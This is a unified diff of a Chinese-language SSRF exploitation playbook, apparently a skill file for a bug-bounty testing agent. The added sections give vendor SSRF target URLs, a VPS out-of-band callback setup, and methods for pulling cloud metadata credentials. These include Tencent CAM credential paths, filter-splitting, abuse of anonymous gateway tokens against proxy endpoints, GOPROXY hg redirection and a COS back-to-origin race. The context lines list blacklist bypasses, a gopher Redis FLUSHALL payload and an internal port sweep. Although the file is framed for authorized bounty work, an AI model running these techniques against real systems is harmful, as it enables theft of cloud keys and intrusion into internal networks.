@@ -73,7 +73,55 @@ link preview_url avatar_url userAvatar webhook_url image_url cover_url return_ur
 
 ---
 
-## 2. 云元数据 Payload 表（确认 SSRF 后第一优先打这个，凭证=高危及上）
+## 2. OOB 回调源选择（三大来源，按目标所属 SRC 优先用官方靶标）
+
+### 2a. 各大 SRC 官方内网靶标（**首选**——靶标本身即授权证明，报告直接采信）
+
+> 靶标分两类：**有回显**（响应/页面直接出现 flag=SSRF 实锤）与**无回显**（靶标记录访问日志，
+> 报告中写明测试时间+自定义字段由 SRC 后台核验）。目标属于哪家 SRC 就用哪家的靶标，
+> 既绕过"探测内网"合规争议，又是平台认可的判定标准。
+
+| SRC | 有回显靶标 | 无回显靶标（host= 换成你的 dnslog） | 备注 |
+|---|---|---|---|
+| 京东 | `http://ssrf.jd.local/c3f3f53c12674acdc9855f47b8529` | — | 页面出现内容即实锤 |
+| 百度 | `http://bsrc-ssrf.n.baidu-int.com/bsrc_uid` / `http://10.169.4.131/bsrc_uid` | — | uid 取自 `https://bsrc.baidu.com/v2/api/info` 的 userId 字段 |
+| 360 | `http://10.229.2.9:5001` | `http://10.229.2.9:5001/index?host=your_dnslog` | |
+| 腾讯 | `http://tst.qq.com/flag.html` | `http://tst.qq.com/ssrf_forward.php?host=your_dnslog` | |
+| 字节 | `https://src-ssrf.bytedance.net/ssrf` | `https://src-ssrf.bytedance.net/ssrf?host=your_dnslog` | |
+| 美团 | `https://mtsrc-test.sankuai.com/ssrf` | 同左（留存访问记录，报告中写明测试时间由 SRC 核验） | 无独立 host 参数 |
+| 讯飞 | `http://ssrf.security.private/` 或 `http://diting.xfyun.cn` | — | |
+| 小米 | `https://ssrf.dun.mi.com/ssrf/hacker` | 同左（`hacker` 字段自定义用于区分；无回显时报告写自定义字段+访问时间） | |
+| 看云 | `http://10.13.50.28:5555/flag.html` | `http://10.13.50.28:5555/ssrf_forward?host=yourdnslog.domain` | host 直接填域名不带协议 |
+
+**用法纪律**：目标属于表内 SRC → 靶标 URL 直接当参数值打，有回显截图、无回显记录时间；
+目标不在表内 → 用 §2b/§2c 通用通道。靶标只用于"证明 SSRF 存在"，不用于升级利用。
+
+### 2b. 自有 VPS OOB 通道（**通用首选**——完全可控、可抓完整请求、可部署 302 跳转）
+
+你有自己的 VPS 时优先用它替代公共 dnslog（公共面板他人可见、且无法承载 302 跳转/HTTP 回显）：
+
+```bash
+# 最简 DNS+HTTP 双通道监听（VPS 上跑）:
+python -m http.server 80                      # HTTP 回显: curl http://vps-ip/probe-<sink>
+# DNS: 域名 NS 指到 VPS,抓 dns 查询日志(或者直接用 vps-ip 的 A 记录看服务端是否解析)
+
+# 按 sink 打标签(与公共 dnslog 同纪律):
+http://<vps-ip>/probe-img    http://<vps-ip>/probe-import    # 哪个路径被请求=哪个 sink 出网
+
+# VPS 独有优势——302 跳转链(§4 绕过)与 HEAD/GET 分流:
+#   HEAD 返回 200 过预检,GET 302 跳内网/元数据(把 <TGT> 换成 169.254.169.254 或内网地址)
+```
+
+VPS HTTP 日志能看到**服务端来源 IP 与 UA**——顺带完成内网出口测绘（台账案例 1：多网段回连=分布式审计集群）。
+
+### 2c. 公共 dnslog（无 VPS 时的兜底）
+
+`dnslog.cn`（最快）/ `ceye.io` / `interactsh-client`。纪律不变：按 sink 打子标签，
+等 30-120s 轮询，零回调即撤回结论。公共面板有他人可见风险，凭证级内容不要编码进公共子域。
+
+---
+
+## 3. 云元数据 Payload 表（确认 SSRF 后第一优先打这个，凭证=高危及上）
 
 | # | Payload | 目标 | 要点 |
 |---|---|---|---|
@@ -98,7 +146,7 @@ TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
 
 ---
 
-## 3. 绕过变体表（黑名单拦截 169.254/127.x/内网段时逐条试）
+## 4. 绕过变体表（黑名单拦截 169.254/127.x/内网段时逐条试）
 
 ### URL 解析差异（过 IP 黑名单的经典系）
 ```
@@ -128,20 +176,61 @@ gopher://127.0.0.1:6379/_FLUSHALL     # Redis 交互（SRC 禁止,除非授权�
 ldap:// / sftp://                     # 其他协议
 ```
 
+
+## 4b. 云开发/网关代打三招（clown 短表精读，过滤分裂场景的进阶打法）
+
+> 适用：目标部署在腾讯云/阿里云上、且存在云开发/HTTP 网关/代理类功能。
+> 核心洞察：**回环拦截与元数据拦截常是两套规则**——回环 403 ≠ 元数据也拦。
+
+### A. 云厂商元数据路径差（腾讯云双路径，台账案例 2 的深水区）
+
+CAM 临时凭证有两套路径，第一套常 404，**必须再打第二套**：
+```
+/meta-data/cam/security-credentials/<角色名>              # 第一套: 常 404
+/meta-data/cam/service-role-security-credentials/<角色名>  # 第二套: 真正的钥匙路径
+```
+判成：拿到 TmpSecretId / TmpSecretKey / Token 三元组 = 凭证级（TIER 3 即停）。
+只读到 instance-id / 钥匙 404 = 还没成，写 PENDING。
+
+### B. 过滤对照法（判断拦的是"哪一层"）
+
+先打 `http://127.0.0.1/`（回环），再打元数据域名。回环 403 / "Forbidden Loopback"
+**≠ 元数据也被拦**——很多实现只拦回环字符串、不按解析后 IP 拦元数据域名。分裂即继续打。
+
+### C. 匿名网关当入口（云开发 *proxy* 类功能）
+
+官方演示环境/匿名登录（signin/anonymously 类）拿到的 token **不当"已登录权限内"处理**，
+带着它去打 path 含 `proxy` 的接口（参数 targetUrl/url/callback）。一处环境禁掉 ≠ 全产品禁掉，
+换环境继续试。**固定 POST 的开放代理**：直打元数据 405（IMDS 只吃 GET）≠ 没洞——
+先打公网 302（redirect-to 类参数）让代理跟跳转时改写成 GET（阿里云角色在 ram/security-credentials/）。
+
+### D. 公开 GOPROXY（区分于 A 的云开发代理）
+
+公开 GOPROXY（/go/ 路径、模块 /@v/list 会做 ?go-get=1 再跟 VCS）：模块路径写自己的域，
+页面 go-import 配 **hg** 协议 + `http://<厂商元数据域名>/...`（git HTTPS 常超时），
+hg 跟取即出元数据/钥匙。RFC1918 Forbidden ≠ 元数据域名也拦。
+
+### E. COS 回源竞态（见了回源配置再打，条件苛刻）
+
+业务从 COS/OSS 取对象且桶配了"对象不存在则回源"到可控源、且能对同一 key PUT+DELETE：
+一边 PUT（检测时对象在，不回源）一边 DELETE（真正 GET 时回源跟 302）——并发手法见
+`race_condition/SKILL.md`。只证明能配回源没打到内网 = 没成，不进报告。
+
+---
 ---
 
-## 4. 攻击面扫描流程（linkage 阶段执行顺序）
+## 5. 攻击面扫描流程（linkage 阶段执行顺序）
 
 ```
 Step 1  枚举 URL 类参数：browser_probe open/xhr 抓 XHR 参数、ffuf -w paramDict 扫 ?url=
         （含 JS 里挖出的业务参数名,最高信噪比）
 Step 2  每类参数先打 OOB（dnslog 子标签区分 sink）→ 有回调=SSRF 确认,进 Step 3
-Step 3  云元数据表逐条打（§2）→ 有内容=凭证级
+Step 3  云元数据表逐条打（§3）→ 有内容=凭证级
 Step 4  内网探测分层（每层只证明可达,不深挖）:
         http://127.0.0.1:80 → :8080 → :6443(K8s API) → :10250(kubelet) → :2379(etcd)
         → :9090(Prometheus) → :9200(ES) → :6379(Redis) → :8500(Consul)
-Step 5  有白名单/黑名单 → §3 绕过表逐条试（每条都配 OOB 验证）
-Step 6  盲打场景 → §5 盲打技巧三连
+Step 5  有白名单/黑名单 → §4 绕过表逐条试（每条都配 OOB 验证）
+Step 6  盲打场景 → §6 盲打技巧三连
 ```
 
 **时序 oracle（盲打枚举 IAM 角色/内网端口）**：响应大小与耗时正相关——同一个 pingback 类
@@ -150,7 +239,7 @@ Step 6  盲打场景 → §5 盲打技巧三连
 
 ---
 
-## 5. 盲打技巧三连（响应不回显时的确认/升级手段）
+## 6. 盲打技巧三连（响应不回显时的确认/升级手段）
 
 1. **业务错误消息即 fetch 证明**：上传/审核/转存类接口返回"图片违规/下载失败/格式错误"
    = 服务端真的拉取了你的 URL。这是**业务层 oracle**，比 OOB 还直接，且能定位到具体功能。
@@ -162,7 +251,7 @@ Step 6  盲打场景 → §5 盲打技巧三连
 
 ---
 
-## 6. 验证与收尾（FOUND→CONFIRMED 的标准）
+## 7. 验证与收尾（FOUND→CONFIRMED 的标准）
 
 - 证据链：请求原文（xsreq 落盘）+ OOB 回调截图/日志行 + 响应内容（元数据/内网响应）。
 - 三级分类：回调+内容=CONFIRMED；仅回调无内容=CONFIRMED(盲打,写明可达范围)；
